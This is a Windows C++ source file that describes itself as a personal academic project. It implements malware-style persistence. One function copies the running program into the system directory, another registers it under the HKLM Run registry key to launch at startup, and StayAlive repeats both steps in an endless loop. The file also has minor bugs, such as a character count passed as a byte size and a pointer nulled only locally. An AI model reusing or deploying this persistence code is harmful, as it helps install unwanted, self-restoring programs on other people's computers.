// This is a personal academic project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++ and C#: http://www.viva64.com

#include "pch.hpp"

#include "Tools.hpp"
#include "Debugger.hpp"

BOOL Copy2Sysdir(CONST PTCHAR appname)
{
	HMODULE hModule = NULL;
	if(!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, NULL, &hModule))
	{
		PrintError(TEXTH("GetModuleHandleEx"), GetLastError());

		return FALSE;
	}

	TCHAR filepath[SMALL_BUFFER_LENGTH] = { 0 };
	if (!GetModuleFileName(hModule, filepath, SMALL_BUFFER_LENGTH))
	{
		PrintError(TEXTH("GetModuleFileName"), GetLastError());

		return FALSE;
	}

	TCHAR filename[SMALL_BUFFER_LENGTH] = TEXT("\\");
	errno_t code = _tcscat_s(filename, SMALL_BUFFER_LENGTH, appname);
	if (code != 0)
	{
		$ERROR(TEXTH("Cannot construct filename, error: %d"), code);

		return FALSE;
	}

	TCHAR sysdir[SMALL_BUFFER_LENGTH] = { 0 };
	if (!GetSystemDirectory(sysdir, SMALL_BUFFER_LENGTH))
	{
		PrintError(TEXTH("GetSystemDirectory"), GetLastError());

		return FALSE;
	}

	code = _tcscat_s(sysdir, SMALL_BUFFER_LENGTH, filename);
	if (code != 0)
	{
		$ERROR(TEXT("Cannot construct sysdir path, error: %d"), code);

		return FALSE;
	}

	// _tprintf(TEXT("filepath:%s, sysdir:%s\n"), filepath, sysdir);
	if(!std::filesystem::exists(sysdir))
		if (!CopyFileEx(filepath, sysdir, NULL, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS))
		{
			PrintError(TEXTH("CopyFile"), GetLastError());

			return FALSE;
		}                        

	return TRUE;
}

BOOL SaveInReg(CONST PTCHAR appname)
{
	TCHAR filename[SMALL_BUFFER_LENGTH] = TEXT("\\");
	errno_t code = _tcscat_s(filename, SMALL_BUFFER_LENGTH, appname);
	if (code != 0)
	{
		_tprintf(TEXT("Cannot construct filename, error: %d"), code);

		return FALSE;
	}

	TCHAR sysdir[SMALL_BUFFER_LENGTH] = { 0 };
	if (!GetSystemDirectory(sysdir, SMALL_BUFFER_LENGTH))
	{
		PrintError(TEXTH("GetSystemDirectory"), GetLastError());

		return FALSE;
	}

	code = _tcscat_s(sysdir, SMALL_BUFFER_LENGTH, filename);
	if (code != 0)
	{
		_tprintf(TEXT("Cannot construct sysdir path, error: %d"), code);

		return FALSE;
	}

	HKEY hKey = NULL;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0ul, KEY_WRITE, &hKey) != ERROR_SUCCESS)
	{
		PrintError(TEXTH("RegOpenKeyEx"), GetLastError());

		return FALSE;
	}

	if (RegSetValueEx(hKey, appname, 0ul, REG_EXPAND_SZ, reinterpret_cast<BYTE*>(sysdir), SMALL_BUFFER_LENGTH) != ERROR_SUCCESS)
	{
		PrintError(TEXTH("RegSetValueEx"), GetLastError());
		if (RegCloseKey(hKey) != ERROR_SUCCESS)
			PrintError(TEXTH("RegCloseKey"), GetLastError());

		return FALSE;
	}

	if (RegCloseKey(hKey) != ERROR_SUCCESS)
	{
		PrintError(TEXTH("RegCloseKey"), GetLastError());

		return FALSE;
	}

	return TRUE;
}

VOID StayAlive(CONST PTCHAR appname)
{
	for(;;)
	{
		Copy2Sysdir(appname);
		SaveInReg(appname);
	}
}

VOID SafeFree(LPVOID ptr)
{
	if (ptr)
	{
		free(ptr);

		ptr = NULL;
	}
}